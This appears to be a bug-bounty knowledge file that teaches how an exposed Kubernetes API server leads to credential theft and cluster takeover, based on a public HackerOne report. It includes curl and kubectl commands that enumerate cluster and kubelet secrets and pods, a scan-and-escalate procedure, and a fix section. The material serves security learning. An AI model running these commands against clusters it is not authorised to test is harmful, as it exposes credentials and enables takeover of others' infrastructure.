---
name: exposed-kubernetes-api
description: Exposed Kubernetes API server (unauth/weak) → RCE and credential theft. Teaches K8s API enumeration, kubeconfig/creds abuse, and how a single open API port becomes cluster takeover.
sources: hackerone_public
report_count: 1
---

# Exposed Kubernetes API → RCE / Credential Theft

**Report**: Snapchat — "Exposed Kubernetes API - RCE/Exposed Creds" (hackerone.com/reports/455645, critical, $25,000, OS Command Injection).

## Why it matters (the new lesson)
An exposed `kube-apiserver` (default 6443/8080) with anonymous auth or a leaked token gives cluster-level control: list secrets (all app creds), create pods (mount host FS → node RCE), read service account tokens. One port = whole environment. High-value recon target.

## How it works
```
curl -k https://TARGET:6443/api/v1/namespaces/default/secrets
curl -k https://TARGET:6443/api/v1/namespaces/kube-system/secrets
curl -k https://TARGET:6443/version           # fingerprint
```
Anonymous (`system:anonymous`) or an old/leaked service-account token grants these.

## How to hunt for it
1. Port-scan 6443/10250 (kubelet) / 10255 / 2379 (etcd) across ranges (naabu/masscan).
2. Hit `/version`, `/api`, `/apis`, `/healthz`; check for anonymous access.
3. Enumerate secrets, service accounts, then create a privileged pod with hostPath to read node files / escape.

## Payloads
```bash
curl -sk https://IP:10250/pods                     # kubelet read-only (if unauth)
curl -sk https://IP:6443/api/v1/secrets
# create pod:
kubectl --server https://IP:6443 --token ANON auth can-i --list
```

## Fix
Disable anonymous auth (`--anonymous-auth=false`); require RBAC + strong auth; firewall apiserver/kubelet to trusted nets; rotate service-account tokens; enable audit logging.
